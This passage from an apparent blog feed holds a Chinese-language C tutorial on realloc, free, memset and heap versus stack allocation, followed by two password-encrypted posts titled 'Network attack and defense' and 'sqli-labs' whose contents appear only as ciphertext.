operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//输入待插入的元素x提示信息：</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input x:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>insert_data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//确定待插入位置的索引值</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>insert_data <span class="token operator">&lt;</span> <span class="token operator">*</span><span class="token punctuation">(</span>pNumber<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            index <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//用realloc()新分配一块内存，用于存储原数组和新插入的值</span>    pNewArray <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">realloc</span><span class="token punctuation">(</span>pNumber<span class="token punctuation">,</span> <span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pNewArray <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Not enough memory\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//free(pNumber); </span>    <span class="token comment" spellcheck="true">//输出新分配的内存空间的值，查看是否实现了复制</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%4d"</span><span class="token punctuation">,</span> pNewArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//待插入位置及后面的所有数据依次向后移1位</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> n<span class="token punctuation">;</span> i  <span class="token operator">></span> index<span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token operator">*</span><span class="token punctuation">(</span>pNewArray<span class="token operator">+</span>i<span class="token punctuation">)</span> <span class="token operator">=</span> pNewArray<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span><span class="token punctuation">(</span>pNewArray <span class="token operator">+</span> index<span class="token punctuation">)</span> <span class="token operator">=</span> insert_data<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"After insert %d:\n"</span><span class="token punctuation">,</span> insert_data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%4d"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>pNewArray<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">free</span><span class="token punctuation">(</span>pNewArray<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h2 id="0x03-free-amp-memset"><font color="#03a9f4" face="Comic sans MS">0x03 free() &amp; memset()</font><a href="post/memory#0x03-free-amp-memset"></a></h2><h3 id="0x001-free"><font color="#00C5CD" face="Comic sans MS">0x001 free()</font><a href="post/memory#0x001-free"></a></h3><p>free()函数声明：<strong><code>void free(void *ptr);</code></strong></p><blockquote><p><strong>说明：</strong>释放ptr指向的内存空间，ptr必须是之前调用过malloc,calloc,realloc这三个函数返回的，否则，如果free(ptr)已经执行过了，而又没有重新赋值给ptr的话，又执行一次free(ptr)会导致意外发生（undefined behavior occurs.），如果ptr指向的是NULL，则不会做任何操作。</p></blockquote><p>示例：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You are failed to applicate the memory.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    p<span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//一定要给p赋个值NULL，否则再次free(p)会报错</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>其实它就做了一件事：<font color="#FF7F00"><strong>斩断指针变量与这块内存的关系</strong></font>。</p><blockquote><p>free函数就是把这块内存和p之间的所有关系斩断。从此p和那块内存之间再无瓜葛。<strong>至于指针变量p本身保存的地址并没有改变（即指针p的值仍然是刚才的地址，只是再也不能通过p来使用刚才的地址了。），但是它对这个地址处的那块内存却已经没有所有权了。那块被释放的内存里面保存的值也没有改变，只是再也没有办法使用了</strong>。</p><ol><li>这就是free函数的功能。按照上面的分析，如果对p连续两次以上使用free函数，肯定会发生错误。因为第一使用free函数时，p所属的内存已经被释放，第二次使用时已经无内存可释放了。</li><li>malloc两次只free一次会内存泄漏；malloc一次free两次肯定会出错。也就是说，在程序中malloc的使用次数一定要和free相等，否则必有错误。这种错误主要发生在循环使用malloc函数时，不要把malloc和free对数弄错了。</li><li>内存释放之后，既然使用free函数之后指针变量p本身保存的地址并没有改变，那我们就需要重新把p的值变为NULL。</li><li>释放完块内存之后，没有把指针置NULL，这个指针就成为了“<strong>野指针</strong>”，也有书叫“<strong>悬垂指针</strong>”。这是很危险的，而且也是经常出错的地方。所以一定要记住一条：<font color="red"><strong>free完之后，一定要给指针置NULL</strong></font>。</li></ol></blockquote><p><strong>注意：</strong>内存已经被释放了，但是继续通过指针来使用！</p><blockquote><p><strong>这里一般有三种情况：</strong><br>第一种：就是上面所说的，free（p）之后，继续通过p指针来访问内存。解决的办法就是给p置NULL。<br>第二种：函数返回栈内存。这是初学者最容易犯的错误。比如在函数内部定义了一个数组，却用return语句返回指向该数组的指针。解决的办法就是弄明白栈上变量的生命周期。<br>第三种：内存使用太复杂，弄不清到底哪块内存被释放，哪块没有被释放。解决的办法是重新设计程序，改善对象之间的调用关系。</p></blockquote><h3 id="0x002-memset"><font color="#00C5CD" face="Comic sans MS">0x002 memset()</font><a href="post/memory#0x002-memset"></a></h3><p>函数声明：<strong><code>void *memset(void *s, int c, unsigned long n);</code></strong></p><p>定义变量时一定要进行初始化，尤其是数组和结构体这种占用内存大的数据结构。在使用数组的时候经常因为没有初始化而产生“烫烫烫烫烫烫”这样的野值，俗称“乱码”。</p><p>每种类型的变量都有各自的初始化方法，memset() 函数可以说是初始化内存的“万能函数”，通常为新申请的内存进行初始化工作。它是直接操作内存空间，mem即“内存”（memory）的意思。该函数的原型为：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property"># <span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">memset</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>函数的功能是：</strong>将指针变量 s 所指向的前 n 字节的内存单元用一个“整数” c 替换，注意 c 是 int 型。s 是 void* 型的指针变量，所以它可以为任何类型的数据进行初始化。</p><p>memset() 的作用是在一段内存块中填充某个给定的值。因为它只能填充一个值，所以该函数的初始化为原始初始化，无法将变量初始化为程序中需要的数据。用memset初始化完后，后面程序中再向该内存空间中存放需要的数据。</p><p>memset 一般使用“0”初始化内存单元，而且通常是给数组或结构体进行初始化。一般的变量如 char、int、float、double 等类型的变量直接初始化即可，没有必要用 memset。如果用 memset 的话反而显得麻烦。</p><p>当然，数组也可以直接进行初始化，但 memset 是对较大的数组或结构体进行清零初始化的最快方法，因为它是直接对内存进行操作的。</p><p>这时有人会问：“字符串数组不是最好用’\0’进行初始化吗？那么可以用 memset 给字符串数组进行初始化吗？也就是说参数 c 可以赋值为’\0’吗？”</p><p>可以的。虽然参数 c 要求是一个整数，但是整型和字符型是互通的。但是赋值为 ‘\0’ 和 0 是等价的，因为字符 ‘\0’ 在内存中就是 0。所以在 memset 中初始化为 0 也具有结束标志符 ‘\0’ 的作用，所以通常我们就写“0”。</p><p>memset 函数的第三个参数 n 的值一般用 sizeof()  获取，这样比较专业。注意，如果是对指针变量所指向的内存单元进行清零初始化，那么一定要先对这个指针变量进行初始化，即一定要先让它指向某个有效的地址。而且用memset给指针变量如p所指向的内存单元进行初始化时，n 千万别写成 sizeof(p)，这是新手经常会犯的错误。因为 p 是指针变量，不管 p 指向什么类型的变量，sizeof(p) 的值都是 4。</p><p>下面写一个程序：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property"># <span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"># <span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//循环变量</span>    <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>p <span class="token operator">=</span> str<span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//只能写sizeof(str), 不能写sizeof(p)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\x20"</span><span class="token punctuation">,</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>根据memset函数的不同，输出结果也不同，分为以下几种情况：<span class="token function">memset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//地址的大小都是4字节</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token operator">-</span><span class="token number">52</span> <span class="token operator">-</span><span class="token number">52</span> <span class="token operator">-</span><span class="token number">52</span> <span class="token operator">-</span><span class="token number">52</span> <span class="token operator">-</span><span class="token number">52</span> <span class="token operator">-</span><span class="token number">52</span><span class="token function">memset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//*p表示的是一个字符变量, 只有一字节</span><span class="token number">0</span> <span class="token operator">-</span><span class="token number">52</span> <span class="token operator">-</span><span class="token number">52</span> <span class="token operator">-</span><span class="token number">52</span> <span class="token operator">-</span><span class="token number">52</span> <span class="token operator">-</span><span class="token number">52</span> <span class="token operator">-</span><span class="token number">52</span> <span class="token operator">-</span><span class="token number">52</span> <span class="token operator">-</span><span class="token number">52</span> <span class="token operator">-</span><span class="token number">52</span><span class="token function">memset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span><span class="token function">memset</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span><span class="token function">memset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//直接写10也行, 但不专业</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-Summary"><font color="#03a9f4" face="Comic sans MS">0x04 Summary</font><a href="post/memory#0x04-Summary"></a></h2><h3 id="0x001-C-C-程序内存分配"><font color="#00C5CD" face="Comic sans MS">0x001 C/C++程序内存分配</font><a href="post/memory#0x001-C-C-程序内存分配"></a></h3><div class="article-img"><p><img src="https://i.loli.net/2019/06/06/5cf8befa94fbc58191.png" alt="20180818211016694.png" data-zoomable></p></div><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font></p><ol><li>内存泄漏(仅存在程序运行时，程序退出，OS将回收所有资源)是指那些本应该回收（不再使用）的内存对象无法被系统回收的现象。在c/c++中需要程序猿手动释放内存对象，所以在C/C++中更容易存在内存泄漏。java引入了自动回收机制，使得在C/C++中令人头疼的内存问题得到了有效的改善，但这并不意味着java程序员不关注内存，因为垃圾回收机制不能完全保证内存对象在该释放的地方释放.</li><li>内存溢出指的是系统在为某段执行指令（程序）分配内存的时候，发现内存不足，抛出错误。</li></ol></blockquote><br><h3 id="0x002-C-C-内存分配方式"><font color="#00C5CD" face="Comic sans MS">0x002 C/C++内存分配方式</font><a href="post/memory#0x002-C-C-内存分配方式"></a></h3><blockquote><ol><li><font color="#FF7F00"><strong>在栈上创建</strong></font><br>在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放.栈内存分配运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限.</li><li><font color="#FF7F00"><strong>从堆上分配，亦称动态内存分配</strong></font><br>程序在运行的时候用malloc或new申请任意多少的内存，程序员自己负责在何时用free或delete释放内存.动态内存的生存期由用户决定，使用非常灵活，但问题也最多.</li><li><font color="#FF7F00"><strong>从静态存储区域分配</strong></font><br>内存在程序编译的时候就已经分配好，这块内存在程序的整个运行期间都存在.例如全局变量、static变量.</li></ol></blockquote><br><h3 id="0x003-C语言内存申请相关的函数"><font color="#00C5CD" face="Comic sans MS">0x003 C语言内存申请相关的函数</font><a href="post/memory#0x003-C语言内存申请相关的函数"></a></h3><blockquote><ol><li><strong>alloca</strong> 是向栈申请内存,因此无需释放.</li><li><strong>malloc</strong> 分配的内存是位于堆中的，并且没有初始化内存的内容，malloc() 不初始化，里边数据是未知的垃圾数据，因此基本上malloc之后,调用函数memset来初始化这部分的内存空间.</li><li><strong>calloc</strong> 则将初始化这部分的内存，设置为0。</li><li><strong>realloc</strong> 则对malloc申请的内存进行大小的调整。</li><li>申请的内存最终需要通过函数free来释放。<br><font color="#FF7F00"><strong>注意：</strong></font><br>当程序运行过程中malloc了,但是没有free的话,会造成内存泄漏.一部分的内存没有被使用,但是由于没有free,因此系统认为这部分内存还在使用,造成不断的向系统申请内存,使得系统可用内存不断减少.但是内存泄漏仅仅指程序在运行时,程序退出时,OS将回收所有的资源.因此,适当的重起一下程序,有时候还是有点作用.</li></ol></blockquote><br><h3 id="0x004-malloc，realloc，calloc函数声明"><font color="#00C5CD" face="Comic sans MS">0x004 malloc，realloc，calloc函数声明</font><a href="post/memory#0x004-malloc，realloc，calloc函数声明"></a></h3><blockquote><ul><li><strong>void* malloc(unsigned size)</strong>;</li><li><strong>void* realloc(void* ptr, unsigned newsize)</strong>;</li><li><strong>void* calloc(size_t numElements, size_t sizeOfElement)</strong>; </li></ul></blockquote><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font>都在stdlib.h函数库内，它们的返回值都是请求系统分配的地址,如果请求失败就返回NULL.<br>(1)函数malloc()<br>在内存的动态存储区中分配一块长度为size字节的连续区域，参数size为需要内存空间的长度，返回该区域的首地址.<br>(2)函数calloc()<br>与malloc相似,参数sizeOfElement为申请地址的单位元素长度,numElements为元素个数，即在内存中申请numElements*sizeOfElement字节大小的连续地址空间.<br>(3)函数realloc()<br>给一个已经分配了地址的指针重新分配空间,参数ptr为原有的空间地址,newsize是重新申请的地址长度.</p></blockquote><br><ol><li><font color="#FF7F00"><strong>函数malloc不能初始化所分配的内存空间，而函数calloc能</strong></font>。如果由malloc()函数分配的内存空间原来没有被使用过，则其中的每一位可能都是0；反之, 如果这部分内存曾经被分配过，则其中可能遗留有各种各样的垃圾数据。也就是说，使用malloc()函数的程序开始时(内存空间还没有被重新分配)能正常进行,但经过一段时间(内存空间还已经被重新分配)可能会出现问题。</li><li>函数calloc() 会将所分配的内存空间中的每一位都初始化为零，也就是说，如果你是为字符类型或整数类型的元素分配内存，那么这些元素将保证会被初始化为0；如果你是为指针类型的元素分配内存,那么这些元素通常会被初始化为空指针；如果你为实型数据分配内存，则这些元素会被初始化为浮点型的零。</li><li>函数malloc向系统申请分配指定size个字节的内存空间.返回类型是 void*类型。void*表示未确定类型的指针。<font color="#FF7F00"><strong>C,C++规定，void* 类型可以强制转换为任何其它类型的指针</strong></font>。 </li><li>realloc可以对给定的指针所指的空间进行扩大或者缩小，无论是扩张或是缩小，原有内存的中内容将保持不变.当然，对于缩小，则被缩小的那一部分的内容会丢失。realloc并不保证调整后的内存空间和原来的内存空间保持同一内存地址。相反，realloc返回的指针很可能指向一个新的地址。</li><li>realloc是从堆上分配内存的。当扩大一块内存空间时，realloc()试图直接从堆上现存的数据后面的那些字节中获得附加的字节，如果能够满足，自然天下太平；如果数据后面的字节不够，问题就出来了，那么就使用堆上第一个有足够大小的自由块，现存的数据然后就被拷贝至新的位置，而老块则放回到堆上。这句话传递的一个重要的信息就是数据可能被移动。</li></ol><br><p>参考资料：<br>参考资料：</p><ul><li><p><font color="#00B2EE"><a href="https://www.runoob.com/cprogramming/c-memory-management.html" target="_blank" rel="noopener">《C 内存管理》</a></font></p></li><li><p><font color="#00B2EE"><a href="http://c.biancheng.net/c/" target="_blank" rel="noopener">《C语言中文网-C语言教程》</a></font></p></li><li><p><font color="#00B2EE"><a href="http://c.biancheng.net/cpp/u/cjinjie/list_48_2.html" target="_blank" rel="noopener">《C语言深度剖析【进阶篇】》</a></font></p></li><li><p><font color="#00B2EE"><a href="https://www.cnblogs.com/chunzhulovefeiyue/p/6821317.html" target="_blank" rel="noopener">《如何使用 malloc 函数》</a>]</font></p></li><li><p><font color="#00B2EE"><a href="https://blog.csdn.net/qq_41035588/article/details/81813480" target="_blank" rel="noopener">《【C语言】malloc、calloc、realloc的区别》</a></font></p></li><li><p><font color="#00B2EE"><a href="https://blog.csdn.net/qq_41119046/article/details/80057135" target="_blank" rel="noopener">《C语言—动态内存分配之malloc与realloc的区别》</a></font></p></li><li><p><font color="#00B2EE"><a href="https://www.cnblogs.com/stevenwuzheng/p/5484986.html" target="_blank" rel="noopener">《C语言中malloc()和calloc()c函数用法》</a></font></p></li><li><p><font color="#00B2EE"><a href="https://blog.csdn.net/sinat_35297665/article/details/78925121" target="_blank" rel="noopener">《C语言calloc()函数：分配内存空间并初始化》</a></font></p></li><li><p><font color="#00B2EE"><a href="https://blog.csdn.net/21aspnet/article/details/1540020" target="_blank" rel="noopener">《关于C语言中的malloc和free函数的用法》</a></font> </p></li><li><p><font color="#00B2EE"><a href="https://wenku.baidu.com/view/d48102f0d1d233d4b14e852458fb770bf78a3bdf.html" target="_blank" rel="noopener">《c语言深度剖析》----陈正冲</a></font></p></li><li><p><font color="#00B2EE"><a href="https://www.cnblogs.com/xkfz007/archive/2012/02/27/2369562.html" target="_blank" rel="noopener">《读书笔记之：C语言深度剖析》</a></font></p></li><li><p><font color="#00B2EE"><a href="http://c.biancheng.net/view/231.html" target="_blank" rel="noopener">《memset函数及其用法，C语言memset函数详解》</a></font></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> C&amp;C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> C-Memory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Network attack and defense</title>
      <link href="/post/Network-attack-and-defense/"/>
      <url>/post/Network-attack-and-defense/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX187rEusVYnf8tW6iU2uoiUb6iKPXEgipXTeeeKh0bJ3ZMMfKYtDz74Mt1hh0t0wKVsqGEkxM+W9JioXYfZNhgjikmM0co7L8Mqz4yvr85FKU8FL2/1acZiDUOdzJC+H8MCiMZMvlwHtg2OANO5ruUx7/NSd7C9JrChbo+EuAcaqqlGVg1qvn1a7U08VXVr+HF4nvRogWgD74mcnoGIB5TAJy+DaKn+GoxbHvwaIOPv4H10QMJ8XLDYwcmFP/4w0n4L49vX8tKzTMNtJ5Uw2I11xKsWS5KtxkQE9LN2TnG5MSIvfg4pPpaaGwck7dVY2p3Pyus6Eg2IHJj2VbVAiyC3P0mbt4WcP7dPCD/7DffykgthJS2YQkCTy8kvt/zTYlN2bQ2aP2MpPwXprgQRiA1DUHQ11LI4/ndp2q1ths7OydhGCyo4EsgrvpZC1bqhD/k78EFLH+FdtknIfSkaqgoOxj+HzAEKYtT+RrCjwF8AevOTZPR4v+M6r9ZMAkKPqEhlqmCzEnTlK9G+f+fii9kdR9LU9p0+uZfRzTmC0QApjqcZc7nmAMo4F0ZlPFxDJolTYKbEVdB2C5M6egvEan9LIWLl+YnjsZmbrecDkmzNN6k2CyJi7YruXFApKh8bD3G9uNtuTjDujTBTVyWZXIfrCb9i5xjIbD1TGIaSo8dkG1yYF6L/WyrI9/MV/hxci5EKVtLW718yIs0ZL5e80XEKhvB7qYUpEiDw=</div>]]></content>
      
      
      <categories>
          
          <category> Network-Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="/post/sqli-labs/"/>
      <url>/post/sqli-labs/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1+aSx7wrDJ0GvNdrscP3oarvmrVvhd4TawgDWzAfVdnBu2lA1MUHy/8s2PSgKBcEK8EJSzkY02sOblidsauiSLRA9l3Ic3RMe5plKY5/khsnaQMtv/GxvjQ4Ecwg4R4fooLxtFEtQp3TlwsZ88fNRDJ89277qKBvZNsk1305NJKxbQvTKIJk0rop4f3/qY6HOatDIKKHofLTyf3UqOIZJRhZD9p8jlMOGlLVeSYeDeqmCxD48AROSAh2/TaXZgW+ruGpiGE42JwErw/Rg6RSgTmisLjAwtH+KvlsG6xdDoPX7K1p0yJiV0AhWZaseP6pGYdUZL2glQHL2sK75VSGvacam3LIPwZ5x/2sRNhhU34wlsjZXfb5wFo949y3J65d8SAzLPDEKMBz95QyolIKvDgF6PttExNSlFNekn2QqfMPQZAQDttAEIi6gI1NvXRk24L95DFA9HzXI+0xublDr3nbTkchI87i1ejSIEjmVYnQfc6IZQVWw6PCNYNZYsPKjXGzoyx8bpuAFbLQKKmd9lFe2uggKakruaQ+2v0heReGhWBfdYpZFbfQniMRti3APg/NYd3ZqjSoioQbO7LlsSJ09D9C2z3DljlVFy1TQcWMrOh6H1DZPTq2ohWPUkwzzjP+K58OQVf33IqZePzw5gUA1BaoMpvdKTfA67mW1Ux4U/hDuh0tO2Bz7PtsGKxm0ZPuN3shMghXkjGoIKTiiFFRP2loCHuwSAlcVDTfSIkpr+Wu4XOz6iIsYXDYaLOSY7hh3Q+3xlQCCm1x8u8OinRKd42niltP3grMhYcIEaMwzLy4ApghU/hvBINWTOBLflbWtLhuFil8oAqEw9iiO67kKXbXibSbtJd+7OEUvN982VXyIabeWk+v6XJvdt6HYchZCXcQznIYgDJfR86IfY2erGknjjwRXQn1dfrPhR6gdZ3YRpdKGNQUZQkMXf5QhL8DhzxbVrQBrZRuUAcr8HoIsdfvXfu76bGSywzThpCEZE2KnluzFi0fQ+YIjTYOoMYupuWW7q2OpgCFiWMMTtvazmoS/cu/ZBlJD7TuK/O5irNwVbC0xY+Fb5puFZ4fxCq/zs27PBfsZizd1Rtt3EKHPRh/TtIYxDv